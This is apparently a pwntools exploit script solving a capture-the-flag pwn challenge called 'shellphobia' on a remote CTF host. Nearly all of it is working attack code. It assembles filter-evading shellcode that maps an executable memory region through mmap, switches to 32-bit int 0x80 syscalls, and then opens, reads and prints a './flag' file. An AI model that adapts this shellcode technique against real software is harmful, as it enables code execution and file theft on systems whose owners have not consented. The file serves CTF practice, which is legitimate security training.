#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "pwn.blitzhack.xyz"
PORT =  1337
PROCESS = "./shellphobia"

GREEN = "\033[92m"
RED = "\033[91m"

def show_shellcode(code):
    print(disasm(code))
    print("")

    for ch in code:
        if ch & 1 == 0:
            sys.stdout.write(RED +  hex(ch) + "\033[0m" + " ")
        else:
            sys.stdout.write(GREEN + hex(ch) + "\033[0m" + " ")

    print("\n\n")
        

def exploit(r):    
    context.arch = "amd64"

    # shellcode to write 0x32 to r10
    SC2 = """
        push 0x32
        pop r10
    """

    # shellcode to trigger x86 syscall
    SC3 = """
        int 0x80    
        jmp rcx
    """

    payload = p64(0x4000000)
    payload += asm(SC2).ljust(0x10, b"\x00")
    payload += asm(SC3)
    
    r.sendlineafter(b"name: ", payload)

    SC = """    
        jmp start        
        pop rcx           # padding for later overwrite
        pop rcx
        syscall

        // now we got a rwx section at 0x4000000
        pop r9
        pop rcx           # ecx = int 0x80
        movsxd esi, ecx   # esi = int 0x80
        push r13
        pop rcx           # rcx = start of shellcode
        mov [rcx], esi    # write int 0x80; jmp rcx to start of shellcode

        // x86 read(0, 0x4000000, 0x71)
        push rbx
        pop rcx           # rcx = 0
        add ecx, 3        # rcx = 3
        movsxd eax, ecx   # eax = 3 (read syscall)
        push rbx
        pop rcx
        add ecx, 0x71     # rcx = 0x71
        movsxd edx, ecx   # edx = 0x71
        push rdi
        pop rcx           # ecx = 0x4000000
        push r13          # return to int 0x80 at start of shellcode
        ret

    start:
        // rax = 9
        xchg ecx, eax
        add ecx, 0x5
        add ecx, 0x3
        add ecx, 0x1   
        xchg ecx, eax    

        // rdi = 0x4000000
        pop rdi
        pop rdi
        pop rdi
        pop rdi

        // overwrite start of shellcode with push 0x32; pop r10
        pop rcx              # ecx = push 0x32; pop r10
        movsxd esi, ecx      # esi = push 0x32; pop r10
        push r13             # r13 = start of shellcode
        pop rcx              # rcx = start of shellcode
        mov [rcx], esi       # write push 0x32; pop r10 to start of shellcode

        // rsi = 0x1000
        push rbx
        pop rcx
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f            
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x7f
        add ecx, 0x1f
        add ecx, 1
        movsxd esi, ecx

        // edx = 0x7
        push rbx
        pop rcx
        add ecx, 5
        add ecx, 1
        add ecx, 1        
        movsxd edx, ecx        

        // push address of call 13 to stack
        push r13

        // set r9 to 0x0
        push rbx
        pop r9

        // return to start of shellcode for setting r10 to 0x32 and executing mmap syscall
        ret
        
    """

    SCFINAL = """
        // fd = open("./flag", 0, 0)
        xor rax, rax
        mov al, 5
        mov rbx, 0x4000040
        xor rcx, rcx
        xor rdx, rdx
        int 0x80

        // read(fd, 0x4000000, 200)
        xchg rbx, rax
        xchg rcx, rax
        mov al, 3
        mov dl, 200
        int 0x80

        // write(1, 0x4000000, 200)
        mov al, 4
        xor rbx, rbx
        mov bl, 1
        int 0x80
    """

    payload = asm(SC)
    
    show_shellcode(payload)

    r.sendlineafter(b"length: ", str(len(payload)).encode())

    r.sendafter(b"code: ", payload)

    pause()

    payload = asm(SCFINAL)
    payload = payload.ljust(0x40, b"\x00")
    payload += b"./flag\x00"

    r.send(payload)
    r.interactive()

    return


if __name__ == "__main__":
    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True        
        r = remote("localhost", 1337)
        print(util.proc.pidof(r))
        pause()

    exploit(r)
